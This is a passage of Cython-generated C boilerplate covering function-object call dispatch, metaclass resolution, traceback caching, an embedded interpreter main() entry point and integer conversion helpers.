            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* CalculateMetaclass */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases) {
    Py_ssize_t i, nbases = PyTuple_GET_SIZE(bases);
    for (i=0; i < nbases; i++) {
        PyTypeObject *tmptype;
        PyObject *tmp = PyTuple_GET_ITEM(bases, i);
        tmptype = Py_TYPE(tmp);
#if PY_MAJOR_VERSION < 3
        if (tmptype == &PyClass_Type)
            continue;
#endif
        if (!metaclass) {
            metaclass = tmptype;
            continue;
        }
        if (PyType_IsSubtype(metaclass, tmptype))
            continue;
        if (PyType_IsSubtype(tmptype, metaclass)) {
            metaclass = tmptype;
            continue;
        }
        PyErr_SetString(PyExc_TypeError,
                        "metaclass conflict: "
                        "the metaclass of a derived class "
                        "must be a (non-strict) subclass "
                        "of the metaclasses of all its bases");
        return NULL;
    }
    if (!metaclass) {
#if PY_MAJOR_VERSION < 3
        metaclass = &PyClass_Type;
#else
        metaclass = &PyType_Type;
#endif
    }
    Py_INCREF((PyObject*) metaclass);
    return (PyObject*) metaclass;
}

/* Py3ClassCreate */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name,
                                           PyObject *qualname, PyObject *mkw, PyObject *modname, PyObject *doc) {
    PyObject *ns;
    if (metaclass) {
        PyObject *prep = __Pyx_PyObject_GetAttrStr(metaclass, __pyx_n_s_prepare);
        if (prep) {
            PyObject *pargs = PyTuple_Pack(2, name, bases);
            if (unlikely(!pargs)) {
                Py_DECREF(prep);
                return NULL;
            }
            ns = PyObject_Call(prep, pargs, mkw);
            Py_DECREF(prep);
            Py_DECREF(pargs);
        } else {
            if (unlikely(!PyErr_ExceptionMatches(PyExc_AttributeError)))
                return NULL;
            PyErr_Clear();
            ns = PyDict_New();
        }
    } else {
        ns = PyDict_New();
    }
    if (unlikely(!ns))
        return NULL;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_module, modname) < 0)) goto bad;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_qualname, qualname) < 0)) goto bad;
    if (unlikely(doc && PyObject_SetItem(ns, __pyx_n_s_doc, doc) < 0)) goto bad;
    return ns;
bad:
    Py_DECREF(ns);
    return NULL;
}
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases,
                                      PyObject *dict, PyObject *mkw,
                                      int calculate_metaclass, int allow_py2_metaclass) {
    PyObject *result, *margs;
    PyObject *owned_metaclass = NULL;
    if (allow_py2_metaclass) {
        owned_metaclass = PyObject_GetItem(dict, __pyx_n_s_metaclass);
        if (owned_metaclass) {
            metaclass = owned_metaclass;
        } else if (likely(PyErr_ExceptionMatches(PyExc_KeyError))) {
            PyErr_Clear();
        } else {
            return NULL;
        }
    }
    if (calculate_metaclass && (!metaclass || PyType_Check(metaclass))) {
        metaclass = __Pyx_CalculateMetaclass((PyTypeObject*) metaclass, bases);
        Py_XDECREF(owned_metaclass);
        if (unlikely(!metaclass))
            return NULL;
        owned_metaclass = metaclass;
    }
    margs = PyTuple_Pack(3, name, bases, dict);
    if (unlikely(!margs)) {
        result = NULL;
    } else {
        result = PyObject_Call(metaclass, margs, mkw);
        Py_DECREF(margs);
    }
    Py_XDECREF(owned_metaclass);
    return result;
}

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
